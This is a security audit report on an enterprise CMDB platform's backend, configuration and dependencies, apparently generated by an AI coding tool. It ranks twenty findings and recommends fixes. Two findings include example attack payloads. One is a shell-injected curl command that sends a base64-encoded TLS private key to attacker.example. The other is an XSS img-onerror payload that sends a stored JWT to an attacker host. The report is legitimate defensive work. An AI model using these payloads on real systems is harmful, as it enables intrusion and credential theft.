# General Security Findings — CMDB Enterprise Platform v2.0.1

**Audit date:** 2026-04-17
**Methodology:** Static code analysis, configuration review
**Scope:** Backend API (`backend/src/index.ts`, ~4 145 lines), nginx configuration (absent — see finding below), Docker production compose, LDAP service, Microsoft SSO service, email service, frontend dependencies
**Auditor:** Automated static analysis via Claude Code vibesec-skill

---

## Remediation Update — 2026-04-18 (develop branch, v2.0.2)

| Finding | Status | Commit |
|---------|--------|--------|
| Command injection in CSR endpoint (`execAsync` shell concatenation) | ✅ **Fixed** | `613be53` — replaced with `execFile` + array args (closes #68) |
| JWT stored in `localStorage` — XSS exposure | ✅ **Fixed** | `023328f` — HttpOnly cookie migration (closes #71) |
| Missing Content-Security-Policy header | ✅ **Fixed** | `0798208` — CSP added to nginx + next.config.ts + Helmet (closes #76, #83) |
| Missing Referrer-Policy / Permissions-Policy headers | ✅ **Fixed** | `0798208` — extended headers in nginx (closes #83) |
| Deprecated `speakeasy` TOTP library (unmaintained) | ✅ **Fixed** | `2682216` — replaced with `otplib` (closes #74) |
| LDAP auth fallback behaviour undocumented | ✅ **Fixed** | `6a90aa7` — LDAP_STRICT_MODE env var + docs (closes #78) |
| Backend port 3000 exposed on host in `docker-compose.prod.yml` | 🟡 **Open** | Verify with `docker ps`; may have been fixed in infrastructure |

---

## Executive Summary

The CMDB Enterprise Platform demonstrates a solid security foundation with consistent use of parameterized Prisma tagged-template literals, PKCE-protected SSO, TOTP-based MFA with server-side secret storage, a strict CORS allow-list, and bcrypt-12 password hashing. However, four findings require immediate attention before a production go-live. The most critical is a command injection vulnerability in the CSR generation endpoint (`/api/admin/certificates/csr`) where user-supplied Distinguished Name fields are concatenated unsanitized into a shell command string. A second critical finding is that the backend service port (3000) is directly exposed to the host in `docker-compose.prod.yml`, bypassing any planned nginx TLS gateway. High-severity findings include JWTs stored in `localStorage` (full XSS exposure), missing nginx configuration (no TLS gateway, no security headers at the edge, no nginx-level rate limiting), and a missing Content-Security-Policy header on the frontend. The overall posture is **Good/Moderate** — the injection surface is narrow and the authentication architecture is thoughtful, but the infrastructure hardening gaps must be closed.

---

## Findings Summary

| # | Severity | Category | Finding | CVSS |
|---|----------|----------|---------|------|
| 1 | CRITICAL | Injection | Command injection in CSR generation endpoint | 9.1 |
| 2 | CRITICAL | Configuration | Backend port exposed directly to host in production compose | 8.6 |
| 3 | HIGH | Authentication | JWT stored in `localStorage` — full XSS session hijack risk | 8.1 |
| 4 | HIGH | Configuration | nginx configuration file absent — no TLS gateway, no edge headers | 7.5 |
| 5 | HIGH | Authentication | SSO auto-provisioning defaults to `true` | 7.3 |
| 6 | HIGH | Authorization | `PATCH /api/vulnerabilities` accessible to all authenticated roles (VIEWER included) | 6.8 |
| 7 | MEDIUM | Authentication | Trusted device tokens bound to IP+UA — evasion trivial on enterprise networks | 5.9 |
| 8 | MEDIUM | Authentication | TOTP window of ±1 (30-second codes) — no replay (used-code) tracking | 5.4 |
| 9 | MEDIUM | Configuration | HSTS disabled in `next.config.ts` (commented out) | 5.0 |
| 10 | MEDIUM | Configuration | Content-Security-Policy absent from both backend helmet and frontend headers | 5.0 |
| 11 | MEDIUM | Secrets | `JWT_SECRET` fallback `'cmdb-dev-secret-change-in-production'` used on non-production | 4.8 |
| 12 | MEDIUM | Dependencies | `multer ^1.4.5-lts.1` (LTS fork) — no upstream active development | 4.5 |
| 13 | MEDIUM | Dependencies | `xlsx ^0.18.5` (SheetJS community) — known CVE-2023-30533 (ReDOS) | 4.5 |
| 14 | MEDIUM | Authorization | Audit log purge cron (`AUDIT_RETENTION_DAYS`) is admin-configurable — ISO 27001 immutability risk | 4.3 |
| 15 | LOW | Information | `/health` endpoint publicly accessible with no authentication | 3.1 |
| 16 | LOW | Authentication | MFA is optional (not enforced) for VIEWER and AUDITOR roles | 3.0 |
| 17 | LOW | Information | `txt` and `csv` uploads accepted without any content inspection (magic bytes skipped) | 2.9 |
| 18 | LOW | Configuration | `speakeasy` package (v2.0.0) is unmaintained since 2017 | 2.5 |
| 19 | LOW | Configuration | SMTP TLS verification disabled in non-production environments | 2.5 |
| 20 | INFO | Configuration | `X-Frame-Options: SAMEORIGIN` (frontend) — DENY is preferred for admin tools | — |

---

## Critical Findings

---

### [CRITICAL] Command Injection in CSR Generation Endpoint

**Category:** Injection (OS Command Injection)
**CVSS Score:** 9.1 (Critical) — AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
**Affected:** `backend/src/index.ts:1780–1783`

**Description:**
The `/api/admin/certificates/csr` endpoint accepts free-text Distinguished Name (DN) fields from the request body — `cn`, `c`, `st`, `o`, `ou` — and concatenates them directly into an OpenSSL command string that is executed via `child_process.exec`. No sanitization, allowlist validation, or shell escaping is applied to any of these fields before they reach the shell.

**Attack Vector:**
An authenticated ADMIN sends a crafted `cn` value containing shell metacharacters. Because `exec` passes the command to `/bin/sh -c`, the injected payload executes with the same privileges as the Node.js process (running as the non-root `node` user inside the container, but with access to the filesystem, network, and the shared TLS volume). Example payload:

```
cn = "example.com; curl https://attacker.example/exfil?key=$(cat /app/certs/server.key | base64) #"
```

This would exfiltrate the TLS private key. A reverse shell payload is equally feasible.

**Evidence:**
```typescript
// backend/src/index.ts:1780-1783
const subject = `/CN=${cn}${c ? `/C=${c}` : ''}${st ? `/ST=${st}` : ''}${o ? `/O=${o}` : ''}${ou ? `/OU=${ou}` : ''}`;
const cmd = `openssl req -new -newkey rsa:2048 -nodes -keyout "${keyPath}" -out "${csrPath}" -subj "${subject}"`;
const { stderr } = await execAsync(cmd);
```

Note: `keyPath` and `csrPath` are constructed with `path.join` using a hardcoded base directory, so path traversal in those variables is not exploitable — but the `subject` field is fully attacker-controlled.

**Recommendation:**
Replace the shell execution approach entirely. Use the Node.js `crypto` module or the `node-forge` library to generate the private key and CSR programmatically, without invoking a shell. If OpenSSL must be used, switch to `execFile` (not `exec`) with an argument array, which bypasses shell interpretation:

```typescript
import { execFile } from 'child_process';
const args = [
  'req', '-new', '-newkey', 'rsa:2048', '-nodes',
  '-keyout', keyPath, '-out', csrPath,
  '-subj', `/CN=${cn}/C=${c}/ST=${st}/O=${o}/OU=${ou}`,
];
execFile('openssl', args, callback);
```

Additionally, validate each DN field against a strict allowlist regex (e.g., `^[A-Za-z0-9 .,@_-]{1,64}$`) before use.

---

### [CRITICAL] Backend Port Directly Exposed to Host in Production Compose

**Category:** Configuration / Network Exposure
**CVSS Score:** 8.6 (Critical) — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
**Affected:** `docker-compose.prod.yml:88–89`

**Description:**
The production Docker Compose file binds the backend service's port 3000 directly to the host interface:

```yaml
ports:
  - "${BACKEND_PORT:-3000}:3000"
```

This means the Express API is reachable directly from the host network (and potentially the internet) without traversing nginx. The architecture documentation states that "only nginx exposes host ports" and that the backend should be "internal containers with no host port binding." The actual production compose contradicts this documented intent.

**Attack Vector:**
Any network attacker who can reach TCP port 3000 on the server bypasses nginx entirely, including any TLS termination, request filtering, and edge-level rate limiting that nginx would provide. Attacks can be delivered over plain HTTP. The `loginLimiter` and `apiLimiter` middleware in Express still apply, but these are per-IP and can be bypassed by distributed sources. All sensitive API endpoints (`/api/auth/login`, `/api/admin/*`, etc.) become directly accessible.

**Evidence:**
```yaml
# docker-compose.prod.yml:88-89
ports:
  - "${BACKEND_PORT:-3000}:3000"
```

Compare to the documented intent (CLAUDE.md):
> "Only nginx exposes host ports (443 HTTPS, 80 HTTP→redirect). Frontend and backend are internal containers with no host port binding."

**Recommendation:**
Remove the `ports` directive from the `backend` service in `docker-compose.prod.yml`. Backend should only be reachable from the `cmdb-internal` network by nginx. If a separate nginx service is not present in this compose file (none was found in the repository), add a production nginx service with TLS termination that proxies to the backend internally:

```yaml
backend:
  # Remove the ports: block entirely
  networks:
    - cmdb-internal  # only reachable by nginx
```

---

## High Findings

---

### [HIGH] JWT Stored in localStorage — XSS Session Hijack

**Category:** Authentication / Session Management
**CVSS Score:** 8.1 (High) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
**Affected:** `frontend/contexts/AuthContext.tsx` (by reference), `frontend/lib/apiFetch.ts` (by reference), login endpoint `backend/src/index.ts:847, 868`

**Description:**
All JWTs (both login tokens and SSO-exchanged tokens) are returned in JSON response bodies and stored in `localStorage` by the frontend (`CLAUDE.md` explicitly states this). `localStorage` is accessible to any JavaScript running on the same origin, meaning any XSS vulnerability — including a stored XSS in user-controlled fields such as CI names, document notes, manufacturer names, or LDAP-provisioned usernames — can silently steal the JWT and impersonate the user.

**Attack Vector:**
1. Attacker stores a malicious script payload in a field that is later rendered without sanitization in the frontend (e.g., a CI `name` with `<img src=x onerror=fetch('https://attacker/steal?t='+localStorage.getItem('token'))>`).
2. Any authenticated user viewing the compromised record has their JWT silently exfiltrated.
3. Attacker replays the JWT within its 8-hour validity window to impersonate the victim, including ADMINs.

**Evidence:**
```typescript
// backend/src/index.ts:847 — response body includes raw token string
res.json({ token: signFullToken(), user: userObj(), ... });
// Token is then stored: localStorage.setItem('token', token)  [AuthContext.tsx]
```

**Recommendation:**
Store the JWT in an `httpOnly; Secure; SameSite=Strict` cookie instead of `localStorage`. This prevents JavaScript from reading the token even if XSS occurs:

```typescript
// In the login response handler:
res.cookie('cmdb_token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 8 * 60 * 60 * 1000, // 8 hours
});
```

The frontend would no longer need to read or inject the token manually. This is a significant refactor but eliminates the entire class of XSS-to-session-hijack attacks.

---

### [HIGH] nginx Configuration File Absent — No TLS Gateway, No Edge Security Headers

**Category:** Configuration
**CVSS Score:** 7.5 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
**Affected:** `nginx/conf.d/` (directory empty or non-existent)

**Description:**
The `nginx/conf.d/` directory referenced in `CLAUDE.md` and in the architecture ("nginx TLS gateway") was not found in the repository. The glob search for `nginx/**/*` returned no results. Without nginx:
- There is no TLS termination layer in front of the services.
- There are no edge-level security headers (HSTS, CSP, etc.) enforced by the proxy.
- There is no nginx-level rate limiting (connection limits, request rate limits).
- The `HTTPS_ENABLED` flag in the backend defaults to `false` per the compose file (`${HTTPS_ENABLED:-false}`), meaning the backend serves plain HTTP.
- The frontend and backend ports are exposed directly, as noted in the Critical finding above.

**Attack Vector:**
All API traffic travels over unencrypted HTTP. Credentials (login requests with email + password), session tokens, MFA codes, and all data payloads are transmitted in cleartext and can be intercepted by any network-path attacker.

**Recommendation:**
Add the nginx service and configuration to the production compose. A minimal secure configuration should include:
- TLS termination (certificates from Let's Encrypt or internal CA).
- `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`.
- `Content-Security-Policy` header appropriate for the SPA.
- `X-Frame-Options: DENY`.
- Connection and request rate limits (`limit_req_zone`, `limit_conn_zone`).
- Backend and frontend bound to the internal Docker network only.

---

### [HIGH] SSO Auto-Provisioning Defaults to `true`

**Category:** Authentication / Access Control
**CVSS Score:** 7.3 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
**Affected:** `backend/src/services/microsoftSso.ts:31`

**Description:**
The `AUTO_PROVISION` flag evaluates to `true` unless the environment variable `AZURE_AUTO_PROVISION` is explicitly set to the string `"false"`. The code is:

```typescript
export const AUTO_PROVISION = process.env.AZURE_AUTO_PROVISION !== 'false'; // default true
```

Any user with a valid Microsoft account on the configured tenant (`AZURE_TENANT_ID`) and matching email domain (`AZURE_ALLOWED_DOMAIN`) can authenticate and will be automatically provisioned as a `VIEWER` in the CMDB. If `AZURE_ALLOWED_DOMAIN` is not configured (empty string), **domain validation is skipped entirely**, meaning any valid Microsoft account in the tenant can gain access.

**Attack Vector:**
1. Attacker obtains a guest Microsoft account in the target Azure AD tenant (common in organizations that allow guest invitations).
2. If `AZURE_ALLOWED_DOMAIN` is not set, the attacker authenticates via SSO and is auto-provisioned as a VIEWER.
3. As a VIEWER, the attacker can read all CI inventory, contracts, license data, vulnerability status, and audit logs — significant data exposure for an enterprise CMDB.

**Evidence:**
```typescript
// microsoftSso.ts:31
export const AUTO_PROVISION = process.env.AZURE_AUTO_PROVISION !== 'false'; // default true

// index.ts:599-612 — auto-provision path
if (!AUTO_PROVISION) {
  log.warn(`[SSO] User ${email} not found and auto-provision is disabled`);
  res.redirect(302, `${FRONTEND_URL}/login?error=sso_not_provisioned`);
  return;
}
await prisma.$executeRaw`
  INSERT INTO "users" (...) VALUES (..., 'VIEWER', ...)
`;
```

**Recommendation:**
Change the default to `false` (opt-in, not opt-out). The fail-secure principle requires that security-sensitive defaults be restrictive:

```typescript
export const AUTO_PROVISION = process.env.AZURE_AUTO_PROVISION === 'true'; // default false
```

Also enforce that `AZURE_ALLOWED_DOMAIN` is required when `USE_MICROSOFT_SSO=true`, with a startup check that aborts if it is empty.

---

### [HIGH] PATCH /api/vulnerabilities Accessible to All Authenticated Roles

**Category:** Authorization / Access Control
**CVSS Score:** 6.8 (High) — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
**Affected:** `backend/src/index.ts:1311`

**Description:**
The vulnerability status-update endpoint applies only `authenticateToken` middleware, without `requireAdmin`. This means any authenticated user — including `VIEWER` role — can change the lifecycle status of a vulnerability (e.g., mark a `CRITICAL` vulnerability as `RESUELTO` before it is actually resolved).

**Attack Vector:**
An attacker with a VIEWER account (or an insider) can alter the status of critical vulnerabilities to `RESUELTO` (resolved), suppressing them from alert reports and dashboard counts. This undermines the integrity of the vulnerability management process and could mask actively exploited vulnerabilities from security teams.

**Evidence:**
```typescript
// index.ts:1311 — only authenticateToken, no requireAdmin
app.patch('/api/vulnerabilities', authenticateToken, async (req: Request, res: Response) => {
```

Compare to the comment in the startup log (`index.ts:4129`):
```
console.log(`   → PATCH /api/vulnerabilities          (any role)`);
```

**Recommendation:**
Add `requireAdmin` middleware (or at minimum `requireAudit` to allow AUDITOR read-plus-write on this specific action). If status transitions by analysts are a legitimate VIEWER use case, implement a role-based transition matrix (e.g., VIEWER can set `EN_CURSO`/`PARADO` but not `RESUELTO`; only ADMIN can resolve).

---

## Medium Findings

---

### [MEDIUM] Trusted Device Binding to IP+UA Is Trivially Evasible

**Category:** Authentication
**CVSS Score:** 5.9 (Medium)
**Affected:** `backend/src/index.ts:815–829`

**Description:**
Trusted device tokens are validated against both the stored `ip_address` and `user_agent`. On enterprise networks with NAT, load balancers, or VPNs, all users share the same egress IP, making the IP binding ineffective as a security control. User-Agent strings are trivially replicated by attackers. The binding provides false assurance that a stolen trusted device token cannot be replayed from a different host.

**Recommendation:**
Replace IP+UA binding with a cryptographically signed device identifier that includes a device-specific secret (e.g., a per-device key stored in `localStorage` and included in the login request). Alternatively, shorten the trusted device TTL (from 30 days to 7 days) and implement anomaly detection (excessive re-use of a device token from rapidly changing IPs).

---

### [MEDIUM] TOTP Verification Has No Used-Code Replay Prevention

**Category:** Authentication
**CVSS Score:** 5.4 (Medium)
**Affected:** `backend/src/index.ts:838, 1710`

**Description:**
The `speakeasy.totp.verify` call uses `window: 1`, which accepts codes from the current and adjacent 30-second windows. There is no tracking of previously used codes within a window. An attacker who intercepts a valid TOTP code (e.g., via phishing) can replay it within the same 30-second window from a different IP.

**Evidence:**
```typescript
// index.ts:838
const mfaValid = speakeasy.totp.verify({
  secret: user.mfa_secret, encoding: 'base32',
  token: mfaCode,
  window: 1   // ±1 window, no used-code tracking
});
```

**Recommendation:**
Implement a short-lived (90-second TTL) used-code cache keyed by `userId + code`. Reject any code that has been successfully verified within its valid window. A Redis set or an in-process Map with TTL expiry is sufficient.

---

### [MEDIUM] HSTS Header Disabled in next.config.ts

**Category:** Configuration
**CVSS Score:** 5.0 (Medium)
**Affected:** `frontend/next.config.ts:29–31`

**Description:**
The `Strict-Transport-Security` header is commented out:
```typescript
// { key: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains; preload" },
```

Without HSTS, browsers do not enforce HTTPS for subsequent visits. A network attacker performing an SSL stripping attack (e.g., via MITM on the first visit) can downgrade the connection to HTTP. Once traffic is on HTTP, session tokens and credentials are exposed.

**Recommendation:**
Uncomment the HSTS header once TLS is deployed. Enable it in nginx as well (which would cover the backend API path). Start with a short `max-age` (e.g., 300 seconds) during initial deployment and increase to `31536000` once confirmed working.

---

### [MEDIUM] Content-Security-Policy Header Absent

**Category:** Configuration / XSS Defence
**CVSS Score:** 5.0 (Medium)
**Affected:** `backend/src/index.ts:100–102`, `frontend/next.config.ts:14–34`

**Description:**
Helmet's `contentSecurityPolicy` is explicitly disabled on the backend:
```typescript
contentSecurityPolicy: false,
```

The frontend `next.config.ts` defines several security headers but does not include a `Content-Security-Policy`. Without a CSP, there is no browser-enforced restriction on script sources, meaning any XSS injection can execute arbitrary scripts and access `localStorage` (where JWTs are stored). This finding compounds the severity of the JWT-in-localStorage finding.

**Recommendation:**
Define a strict CSP on the frontend. Since the app uses Next.js and all scripts are self-hosted, a starting policy is:
```
default-src 'self';
script-src 'self' 'nonce-{nonce}';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
connect-src 'self';
frame-ancestors 'none';
base-uri 'self';
```

Use Next.js nonce-based CSP for inline scripts. This significantly raises the bar for XSS exploitation.

---

### [MEDIUM] JWT_SECRET Development Fallback

**Category:** Secrets Management
**CVSS Score:** 4.8 (Medium)
**Affected:** `backend/src/index.ts:55`

**Description:**
When `JWT_SECRET` is not set and `NODE_ENV !== 'production'`, the application uses the hardcoded string `'cmdb-dev-secret-change-in-production'` as the signing secret:

```typescript
const JWT_SECRET_VALUE = JWT_SECRET ?? 'cmdb-dev-secret-change-in-production';
```

If a developer accidentally runs a staging or UAT environment without setting `JWT_SECRET` (and without setting `NODE_ENV=production`), all JWTs will be signed with this publicly known secret. Any attacker who knows the secret can forge tokens for any user with any role.

**Recommendation:**
Remove the fallback value entirely. If the application cannot start without `JWT_SECRET`, make the check unconditional regardless of environment:

```typescript
if (!process.env.JWT_SECRET) {
  console.error('[FATAL] JWT_SECRET is required. Refusing to start.');
  process.exit(1);
}
const JWT_SECRET_VALUE = process.env.JWT_SECRET;
```

---

### [MEDIUM] multer ^1.4.5-lts.1 — No Upstream Active Maintenance

**Category:** Dependencies
**CVSS Score:** 4.5 (Medium)
**Affected:** `backend/package.json:42`

**Description:**
The production codebase uses the community LTS fork (`multer ^1.4.5-lts.1`) rather than the actively maintained `multer@2.x` release. The LTS fork only receives security patches from the community with no SLA. Any new vulnerabilities in file upload parsing logic will have delayed patches or none at all.

**Recommendation:**
Evaluate upgrading to `multer@2.x` once it reaches stable release, or implement alternative file handling (stream directly to disk with manual size enforcement). Monitor the [multer GitHub advisory feed](https://github.com/expressjs/multer/security/advisories).

---

### [MEDIUM] xlsx ^0.18.5 — CVE-2023-30533 (ReDoS in XLSX/CSV Parsing)

**Category:** Dependencies
**CVSS Score:** 4.5 (Medium)
**Affected:** `frontend/package.json:18`

**Description:**
SheetJS (xlsx) version 0.18.x is affected by CVE-2023-30533, a regular expression denial-of-service vulnerability triggered by maliciously crafted spreadsheet input. The community edition (SheetJS CE) at this version is no longer actively patched. The frontend uses this library for CSV/Excel import of CI bulk data.

**Attack Vector:**
An attacker who can persuade an admin user to import a crafted CSV or XLSX file could freeze or crash the browser tab. In a more sophisticated attack where parsing moves server-side, this could extend to a Node.js process DoS.

**Recommendation:**
Replace `xlsx` with a maintained alternative such as `papaparse` (for CSV, already present in `package.json`) and a minimal XLSX reader. If XLSX is required, consider using ExcelJS or the commercial SheetJS Pro edition. Validate and size-limit files before parsing.

---

### [MEDIUM] Audit Log Automatic Purge Undermines ISO 27001 Immutability

**Category:** Authorization / Compliance
**CVSS Score:** 4.3 (Medium)
**Affected:** `backend/src/index.ts:3536–3562`

**Description:**
A cron job deletes audit log records older than `AUDIT_RETENTION_DAYS` (default 365, configurable via environment variable). While retention policies are standard practice, the current design allows an ADMIN user (who controls environment configuration) or an operator to reduce `AUDIT_RETENTION_DAYS` to a short value and destroy forensic evidence. ISO 27001 A.12.4 requires that audit logs be protected against tampering and unauthorized modification.

**Recommendation:**
The audit log purge job should have a minimum floor (e.g., 365 days) enforced in code, not just by documentation. Additionally, consider archiving purged audit logs to an immutable external store (object storage with object-lock/WORM) rather than deleting them. The `audit_logs` table should have no `DELETE` or `UPDATE` grants for the application database user.

---

## Low / Informational Findings

---

### [LOW] /health Endpoint Publicly Accessible Without Authentication

**Category:** Information Disclosure
**CVSS Score:** 3.1 (Low)
**Affected:** `backend/src/index.ts:477–479`

**Description:**
The `/health` endpoint returns `{ status: 'ok', timestamp: ... }` without requiring authentication. While this is intentional for load balancer health checks, it confirms the API is alive to unauthenticated scanners and leaks the server timestamp (useful for timing attacks).

**Recommendation:**
If used by an internal load balancer, restrict the `/health` endpoint to the internal Docker network via nginx configuration. Remove the timestamp from the public response.

---

### [LOW] MFA Not Enforced for VIEWER and AUDITOR Roles

**Category:** Authentication
**CVSS Score:** 3.0 (Low)
**Affected:** `backend/src/index.ts:860–868`

**Description:**
MFA setup is mandatory only for ADMIN users. VIEWER and AUDITOR users receive a "MFA_SETUP_SUGGESTED" prompt on first login but can permanently skip it. An AUDITOR with access to all audit logs and an external password compromise has no second factor protecting their session.

**Recommendation:**
Consider making MFA mandatory for all roles, particularly AUDITOR (who has full read access to audit trails). At minimum, enforce MFA for AUDITOR after a configurable grace period.

---

### [LOW] txt and csv File Uploads Accept Any Content

**Category:** File Upload Security
**CVSS Score:** 2.9 (Low)
**Affected:** `backend/src/index.ts:2790–2793, 2795–2802`

**Description:**
The magic bytes validator explicitly skips validation for `txt` and `csv` files (`checks.length === 0` → `return true`). This allows any file content to be uploaded with a `.txt` or `.csv` extension. While the file is stored with a UUID name and served with `Content-Disposition: attachment`, a stored polyglot file (valid CSV / also valid HTML with scripts) could be exploited if the download endpoint ever changes its behavior.

**Recommendation:**
For `csv` uploads, validate that the content consists only of printable ASCII and UTF-8 characters, and that it contains no HTML/script tags. For `txt`, apply a similar character-set check. Consider limiting the allowed character set for these types.

---

### [LOW] speakeasy v2.0.0 — Unmaintained Since 2017

**Category:** Dependencies
**CVSS Score:** 2.5 (Low)
**Affected:** `backend/package.json:48`

**Description:**
The `speakeasy` npm package has not received updates since 2017 and has been deprecated. While the TOTP algorithm itself (RFC 6238) is stable, any future discovered bugs in the library (timing side-channels, encoding errors) will not be patched.

**Recommendation:**
Replace with an actively maintained TOTP library such as `otplib` (actively maintained, TypeScript-native, RFC 6238 compliant) or `@simplewebauthn/server` for WebAuthn-based second factors.

---

### [LOW] SMTP TLS Verification Disabled in Non-Production

**Category:** Configuration
**CVSS Score:** 2.5 (Low)
**Affected:** `backend/src/services/emailService.ts:375`

**Description:**
```typescript
tls: { rejectUnauthorized: process.env.NODE_ENV === 'production' },
```

In any environment where `NODE_ENV !== 'production'` (development, staging, UAT), SMTP TLS certificates are not validated. A staging environment configured to send real alert emails to real recipients is vulnerable to SMTP MITM.

**Recommendation:**
Default `rejectUnauthorized` to `true` regardless of environment. Provide a separate opt-out env variable `SMTP_ALLOW_SELF_SIGNED=true` for development environments with self-signed SMTP certs, rather than tying it to `NODE_ENV`.

---

### [INFO] X-Frame-Options Set to SAMEORIGIN Instead of DENY

**Category:** Configuration
**CVSS Score:** N/A (Informational)
**Affected:** `frontend/next.config.ts:19`

**Description:**
The frontend sets `X-Frame-Options: SAMEORIGIN`, which allows the application to be framed by pages on the same origin. For an administrative CMDB application, there is no legitimate same-origin framing use case. `DENY` provides a stronger guarantee against clickjacking.

**Recommendation:**
Change to `X-Frame-Options: DENY`. Complement with CSP `frame-ancestors 'none'`.

---

## Positive Security Controls

The following security controls are well-implemented and reflect deliberate security engineering:

1. **Parameterized SQL everywhere** — All `$queryRaw` and `$executeRaw` calls use Prisma tagged template literals throughout the entire ~4,000-line file. No string concatenation was found in any raw query. LIKE wildcard escaping (`%`, `_`, `\`) is applied before interpolation in the Greenbone and CrowdStrike integration endpoints.

2. **JWT algorithm pinned** — `jwt.verify` is called with `{ algorithms: ['HS256'] }` explicitly, preventing algorithm-confusion (`alg: none`) attacks. JWT signing also specifies `algorithm: 'HS256' as const`.

3. **MFA secret never accepted from client** — During MFA enrollment (`/api/auth/mfa/enable`), the TOTP secret is read from the server-side `mfa_pending_secret` column, not from the request body. A comment explicitly documents this design decision.

4. **SSO state + nonce server-side** — The OAuth2 state and nonce are generated server-side with `crypto.randomUUID()` / `crypto.randomBytes(16)`, stored in a server-side Map, and validated with expiry checks. The SSO token exchange code pattern avoids passing JWTs in redirect URL parameters (mitigating Referer and browser-history leakage).

5. **PKCE (S256) on SSO flow** — The Microsoft SSO flow uses Proof Key for Code Exchange with the S256 challenge method, protecting the authorization code from interception even without the client secret being fully trusted.

6. **Full ID token validation** — The `validateIdToken` function validates `kid` → JWKS key lookup, RS256 signature, `iss`, `aud`, `tid`, `nonce`, and `email domain`. All five required claims are checked, with defense-in-depth `tid` validation beyond the standard issuer check.

7. **Deactivated-user JWT invalidation** — `authenticateToken` performs a live database query on every request to confirm `users.active = true`. A deactivated user's JWT is rejected immediately without waiting for the 8-hour expiry — a security property that many systems lack.

8. **Strong password policy** — bcrypt-12 rounds, role-differentiated minimum lengths (16 chars for ADMIN, 12 for VIEWER), complexity requirements (upper, lower, digit, special), a 350+ entry common-password dictionary check, and a configurable password history (default 20 entries) — all enforced server-side.

9. **LDAP injection prevention** — `escapeLdap()` in `ldap.ts` escapes all RFC 4514/4515 special characters before using user input in LDAP filter attributes. The function escapes backslash first (correct order).

10. **Magic bytes validation on upload** — File uploads are held in memory by multer, and magic bytes are validated against the declared extension before writing to disk. Original filenames are discarded; UUID-based filenames are used exclusively.

11. **Admin MFA mandatory** — ADMIN users are issued a limited-scope JWT (`mfaSetupRequired: true`) on first login that is restricted to only two paths (`/api/auth/mfa/setup` and `/api/auth/mfa/enable`) until MFA is configured.

12. **CORS strict allow-list** — The CORS middleware uses an explicit environment-variable-driven allow-list, rejects unknown origins with a warning log, and does not use wildcards.

13. **Comprehensive audit logging** — Every write operation (CI create/update/delete, contract, document, user role change, password change, MFA events, SSO login, etc.) produces an immutable `audit_logs` record with `action`, `entity`, `entity_id`, `user_email`, and `created_at`.

14. **Secret startup validation** — `JWT_SECRET` absence causes a hard process exit in production (`process.exit(1)`). Database credentials, CORS origins, and `NEXT_PUBLIC_API_URL` are required (`:?` error syntax) in the production compose.

15. **Document download security** — The download endpoint enforces `Content-Disposition: attachment` by default, maintains an allowlist of MIME types safe for inline rendering (PDF, PNG, JPEG), and forces `application/octet-stream` for all others, preventing stored XSS via SVG or HTML document uploads.

---

## Dependency Vulnerability Assessment

### Backend (`backend/package.json`)

| Package | Version | Status | Notes |
|---------|---------|--------|-------|
| `express` | `^5.2.1` | Current | Express 5 — actively maintained |
| `jsonwebtoken` | `^9.0.3` | Current | Latest stable |
| `bcrypt` | `^6.0.0` | Current | Latest stable |
| `zod` | `^3.24.2` | Current | Latest stable |
| `helmet` | `^8.1.0` | Current | Latest stable |
| `express-rate-limit` | `^7.5.0` | Current | Latest stable |
| `@prisma/client` | `^5.10.2` | Slightly behind | Prisma 6.x available; upgrade recommended |
| `multer` | `^1.4.5-lts.1` | **Risk** | LTS community fork, no upstream active development; consider upgrade to multer@2.x |
| `speakeasy` | `^2.0.0` | **Risk** | Last published 2017, deprecated; replace with `otplib` |
| `node-cron` | `^4.2.1` | Current | Latest stable |
| `ldap-authentication` | `^4.0.3` | Current | Appears maintained |
| `nodemailer` | `^8.0.5` | ✅ Patched | GHSA-c7w3-x93f-qmm8, GHSA-vvjj-xcjg-gr5g (SMTP CRLF injection) — patched commit `90aa3df` |
| `path-to-regexp` | override `>=8.3.1` | ✅ Patched | GHSA-j3q9-mxjg-w52f, GHSA-27v5-c462-wpq7 (ReDoS via Express transitive dep) — npm override commit `90aa3df` |

### Frontend (`frontend/package.json`)

| Package | Version | Status | Notes |
|---------|---------|--------|-------|
| `next` | `16.2.4` | ✅ Patched | HTTP request smuggling + CSRF bypass + DoS (was 16.1.6) — patched commit `90aa3df` |
| `react` | `19.2.3` | Current | React 19 latest |
| `xlsx` | removed | ✅ Patched | Replaced with `exceljs ^4.4.0` — xlsx CVE-2023-30533 (ReDoS) + prototype pollution eliminated in commit `90aa3df` |
| `exceljs` | `^4.4.0` | Current | No known CVEs; actively maintained replacement for xlsx |
| `papaparse` | `^5.5.3` | Current | Maintained CSV parser |
| `reactflow` | `^11.11.4` | Current | Consider checking for 12.x |
| `lucide-react` | `^0.577.0` | Current | Icon library, low risk |

### Summary Risk Table

| Severity | Package | CVE / Issue | Status |
|----------|---------|-------------|--------|
| ~~MEDIUM~~ | ~~`xlsx ^0.18.5`~~ | ~~CVE-2023-30533 — ReDoS in XLSX/CSV parsing~~ | ✅ Fixed — replaced with exceljs (commit `90aa3df`) |
| MEDIUM | `multer ^1.4.5-lts.1` | No upstream maintenance, delayed security patches | Open |
| LOW | `speakeasy ^2.0.0` | Deprecated, unmaintained since 2017 | Open |
| INFO | `@prisma/client ^5.10.2` | Prisma 6.x available with performance improvements | Open |

---

*Report generated by static code analysis. All line numbers reference the files as read during this audit session. Dynamic testing (runtime fuzzing, penetration testing) is outside the scope of this report and is recommended before production deployment.*
